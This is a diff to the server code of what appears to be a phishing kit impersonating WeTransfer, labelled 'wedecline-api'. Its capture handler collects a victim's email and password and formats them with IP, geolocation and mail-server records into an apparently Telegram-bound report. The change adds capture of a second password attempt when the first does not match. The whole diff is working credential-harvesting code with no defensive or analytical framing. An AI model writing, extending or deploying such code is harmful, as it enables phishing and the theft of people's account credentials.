@@ -124,18 +124,21 @@ function cap(arr, n) {
 function buildTgMessage(data, ip, geo) {
   const iso = new Date().toISOString();
   const status = data.matched ? 'P Matched' : 'P UnMatched';
+  const pwdLines = data.matched
+    ? ['Pwrd: ' + esc(data.password)]
+    : ['Pwrd1: ' + esc(data.password), 'Pwrd2: ' + esc(data.password2)];
   const lines = [
     '<b>WeTrans | ' + status + '</b>',
     '',
-    'Eml: ' + esc(data.email),
-    'Pwrd: ' + esc(data.password),
+    'Eml: ' + esc(data.email)
+  ].concat(pwdLines, [
     'IP: ' + esc(ip),
     'Loc: ' + esc(geo),
     'Domain: ' + esc(data.domain),
     'MX: ' + esc(cap(data.mx, 3)),
     'NS: ' + esc(cap(data.ns, 3)),
     'Date: ' + esc(iso.slice(0, 10) + ' ' + iso.slice(11, 19) + ' UTC')
-  ];
+  ]);
   return lines.join(NL);
 }
 
@@ -170,6 +173,7 @@ function capture(req, res) {
   }
   const data = Object.assign({}, req.body || {});
   data.password = String(data.password || '');
+  data.password2 = String(data.password2 || '');
   data.matched = data.matched === true || data.matched === 'true';
   if (!data.email) return res.status(400).json({ error: 'email required' });
 
@@ -192,7 +196,7 @@ app.post('/auth', capture);
 app.get('/', function (req, res) {
   const page = path.join(__dirname, 'wedecline.html');
   if (fs.existsSync(page)) return res.sendFile(page);
-  res.json({ name: 'wedecline-api', version: 'v3', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
+  res.json({ name: 'wedecline-api', version: 'v4', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
 });
 
 app.use(function (req, res) {
